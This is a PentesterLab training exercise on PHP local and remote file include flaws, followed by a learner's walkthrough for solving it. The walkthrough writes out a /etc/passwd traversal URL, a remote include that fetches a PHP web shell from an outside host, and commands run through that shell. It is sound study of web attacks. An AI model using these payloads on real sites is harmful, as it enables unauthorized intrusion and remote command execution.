File Include Vulnerabilities

In a lot of applications, developers need to include files to load classes or to share some templates between multiple web pages.

File include vulnerabilities come from a lack of filtering when a user-controlled parameter is used as part of a file name in a call to an including function (require, require_once, include or include_once in PHP for example). If the call to one of these methods is vulnerable, an attacker will be able to manipulate the function to load his own code. File include vulnerabilities can also be used as a directory traversal to read arbitrary files. However, if the arbitrary code contains an opening PHP tag, the file will be interpreted as PHP code.

This including function can allow the loading of local resources or remote resource (a website, for example). If vulnerable, it will lead to:

    Local File Include: LFI. A local file is read and interpreted.
    Remote File Include: RFI. A remote file is retrieved and interpreted.

By default, PHP disables loading of remote files, thanks to the configuration option: allow_url_include. In this lab, it has been enabled to allow you to test it.

In this first example, you can see an error message, as soon as you inject a special character (a quote, for example) into the parameter:

Warning: include(intro.php'): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 Warning: include(): Failed opening 'intro.php'' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7

If you read the error message carefully, you can extract a lot of information:

    The path of the script: /var/www/fileincl/example1.php.
    The function used: include().
    The value used in the call to include is the value we injected intro.php' without any addition or filtering.

We can use the methods used to detect directory traversal, to detect file include. For example, you can try to include /etc/passwd by using the ../ technique.

We can test for Remote File Include, by requesting an external resource: https://pentesterlab.com/. We will see that the page from PentesterLab gets included inside the current page.

Image: https://assets.pentesterlab.com/web_for_pentester/rfi.png

PentesterLab's website also contains a test for this type of vulnerability. If you use the URL http://assets.pentesterlab.com/test_include.txt. You should get the result of the function phpinfo() within the current page:
Finally, to score this exercise, you can either host your own malicious script or you can use this malicious file http://assets.pentesterlab.com/test_include_system.txt and add the command you want to run.

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:

/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

 You can access this exercise using the following URL: http://ptc-59b65eac-740908c8.libcurl.so/. 

 
Common Mistakes:

    * Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

Steps: 
1)  Visit the given url: http://ptc-59b65eac-740908c8.libcurl.so/. And we'll redirected to: http://ptc-59b65eac-740908c8.libcurl.so/?page=intro.php
2)  Let's replace intro.php with google and it redirected the page as: http://ptc-59b65eac-740908c8.libcurl.so/?page=https://google.com
3)  In such cases we can also make directory traversal. See how:
    http://ptc-59b65eac-740908c8.libcurl.so/?page=../.../../../../../../../../../etc/passwd
    And it works even sometimes.
4)  After we get the redirected we can use this malicious file http://assets.pentesterlab.com/test_include_system.txt as given in lab.
5)  While opening the link we can see as:
                <?php 
        system($_GET['c']);
        ?>
6)  Let's this upper link be redirected as: 
        http://ptc-59b65eac-740908c8.libcurl.so/?page=https://assets.pentesterlab.com/test_include_system.txt
        But it don't works.
7)  We can notice we get c in above php code. Including that let's see the id as below:
    http://ptc-59b65eac-740908c8.libcurl.so/?page=https://assets.pentesterlab.com/test_include_system.txt&c=id
8)   So, we can see the id then we can load other system commands. Again let's replace 'id' with 'uname -a'in the parameter as:
    http://ptc-59b65eac-740908c8.libcurl.so/?page=https://assets.pentesterlab.com/test_include_system.txt&c=uname -a. And we can see uname of the system.
9) Then,let's replace 'uname -a' with '/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8'.
10) Bravo! Exercise completed!! 

        Happy Hacking!! :) 





    